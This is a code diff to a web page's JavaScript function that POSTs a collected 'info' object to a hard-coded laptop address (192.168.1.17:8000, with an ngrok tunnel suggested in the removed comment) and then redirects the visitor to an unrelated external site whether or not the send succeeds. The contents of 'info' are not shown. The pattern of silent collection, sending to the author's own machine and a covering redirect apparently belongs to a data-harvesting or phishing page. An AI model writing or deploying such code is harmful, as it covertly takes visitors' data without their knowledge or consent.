@@ -72,30 +72,28 @@
         }
 
         function sendToServer(info) {
-            // Replace with your laptop's IP:port or ngrok URL
-            const serverUrl = "http://your-laptop-ip:8000/submit"; // E.g., http://192.168.1.100:8000/submit or https://abc123.ngrok.io/submit
+            const serverUrl = "http://192.168.1.17:8000/submit"; // Your laptop's IP
+            console.log("Sending data to:", serverUrl);
             fetch(serverUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(info)
             })
                 .then(response => {
-                    if (!response.ok) throw new Error("Server response: " + response.status);
+                    if (!response.ok) throw new Error(`Server error: ${response.status}`);
                     return response.json();
                 })
                 .then(data => {
-                    console.log("Data sent:", data);
-                    // Delay redirect to ensure data is sent
+                    console.log("Data sent successfully:", data);
                     setTimeout(() => {
                         window.location.href = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
-                    }, 500);
+                    }, 1000); // 1-second delay
                 })
                 .catch(err => {
-                    console.error("Failed to send:", err.message);
-                    // Redirect even if sending fails
+                    console.error("Failed to send data:", err.message);
                     setTimeout(() => {
                         window.location.href = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
-                    }, 500);
+                    }, 1000);
                 });
         }
 
